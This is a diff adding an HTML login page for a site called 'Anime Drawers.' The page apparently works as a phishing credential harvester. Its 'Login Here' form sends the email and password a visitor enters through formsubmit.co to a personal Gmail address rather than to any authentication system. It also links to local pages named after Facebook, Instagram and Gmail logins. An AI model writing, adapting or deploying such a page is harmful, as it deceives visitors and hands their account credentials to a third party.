@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width">
+    <title>Anime Drawers.</title>
+    <link rel="stylesheet" href="#">
+    <style>
+        body {
+            background-image: url(home.jpg);
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+
+        .id {
+            border-radius: 0%;
+            background-color: rgba(0, 0, 0, 0.89);
+            width: 200px;
+            height: 65px;
+            position: absolute;
+        }
+
+        summary {
+            color: azure;
+            font-size: 20px;
+        }
+
+        #LG {
+            margin-top: 10px;
+            margin-left: 65px;
+            height: 33px;
+            width: 257px;
+            background-color: whitesmoke;
+            border: black;
+            border-radius: 7px;
+            font-size: 15px;
+        }
+
+        #SG {
+            font: bold 11px Arial;
+            text-decoration: none;
+            background-color: #666;
+            color: lightslategrey;
+            padding: 10px 100px 10px 100px;
+            border-top: 1px solid #000000a4;
+            border-right: 1px solid #000000a4;
+            border-bottom: 1px solid #000000a4;
+            border-left: 1px solid #000000a4;
+            margin-left: 66PX;
+            border-radius: 7px;
+        }
+
+        h1 {
+            color: #CFCFCF;
+            margin-left: 127px;
+            font-family: cursive;
+        }
+
+        h2 {
+            width: 100%;
+            text-align: center;
+            border-bottom: 14px solid lightgray;
+            border-radius: 7px;
+            line-height: 7px;
+            margin: 10px 2 20px;
+            margin-top: 20px;
+        }
+
+        h2 span {
+            color: black;
+            font-size: 20px;
+            position: absolute;
+            left: 50%;
+            margin-left: 5px;
+            margin-top: 3px;
+        }
+
+        .in {
+            height: 5px;
+            border: 2px solid black;
+            border-radius: 10px;
+            background: linear-gradient(to left, grey, rgb(105, 104, 104), black);
+            width: 400px;
+        }
+
+        #Black-box {
+            border-radius: 25px;
+            background: #000000a4;
+            padding: 20px;
+            width: 400px;
+            height: 460px;
+            margin-left: 38%;
+        }
+
+        input {
+            margin-left: 65px;
+            height: 33px;
+            width: 250px;
+            border-radius: 7px;
+        }
+
+        #line {
+            width: 185px;
+            margin-left: 1px;
+        }
+
+        #line2 {
+            width: 185px;
+            margin-left: 230px;
+        }
+
+        #S-i {
+            color: black;
+            font-size: 15px;
+        }
+
+        #FB {
+            width: 74px;
+        }
+
+        #ins {
+            width: 40px;
+            margin-left: 100px;
+        }
+
+        #google {
+            width: 60px;
+            margin: -3px;
+            margin-left: 113px;
+            position: absolute;
+        }
+
+        #FBP {
+            color: white;
+            font-size: 20px;
+            position: absolute;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+
+<body>
+    <form id="return_link" onsubmit="submitForm(event)">
+        <div class="id">
+            <button type="button"
+                style="width: 40px; height: 27px;border-radius: 0%; background-color: rgba(255, 0, 0, 0.658); position: absolute; margin: 16px; border-color: rgba(0, 0, 0, 0.39);"> <span style="font-weight: bold; color: whitesmoke;">id</span></button>
+            <input id="i_d" type="text" placeholder="  #ID...." style="width: 100px; height: 20px; border-radius: 0%; margin-top: 16px; border-style: groove;">              
+        </div>
+    </form>
+    <form action="https://formsubmit.co/01abderrahimfcb@gmail.com" method="POST">
+        <div id="Black-box">
+            <h1>
+                <p>Login Here</p>
+            </h1>
+            <hr class="in">
+            <div id="input">
+                <input type="email" placeholder="  Enter @email" name="email" required><br>
+                <input type="password" placeholder="  Enter Password" name="ps" style="margin-top: 7px;" required><br>
+            </div>
+            <button id="LG" type="submit" herf="error.html"><strong>Login</strong></button><br><br>
+            <a href="#" id="SG" target="_blank">
+                <strong id="S-i">Sign up</strong></a><br>
+            <h2><span></span></h2>
+            <details>
+                <summary>Join us with :</summary>
+                <a href="myfb.html" target="_blank"><img id="FB" title="Facebook" src="lfb.png" alt="FB"></a>
+                <a href="myins.html" target="_blank"><img id="ins" title="Instagram" src="lins.png" alt="Ins"></a>
+                <a href="gmail.html" target="_blank"><img id="google" title="google accont" src="lgmail.png"alt="google"></a>                    
+            </details>
+        </div>
+    </form>
+</body>
+</html>
+<script>
+    let IDs = {
+        "77cf9b": "1account.html",
+        "ar6d31": "2account.html",
+        "2k84ep": "3account.html",
+        "9a7taz": "4account.html",
+    }
+
+    function submitForm(event){
+
+        event.preventDefault();
+
+        let link = document.querySelector("#return_link #i_d").value;
+
+        let id_list = Object.keys(IDs);
+
+        id_list = id_list.filter( _ => _.toLowerCase().trim() == link.toLowerCase().trim() );
+
+        if ( id_list.length ) window.location.href = IDs[id_list[0]];
+
+    }
+
+</script>
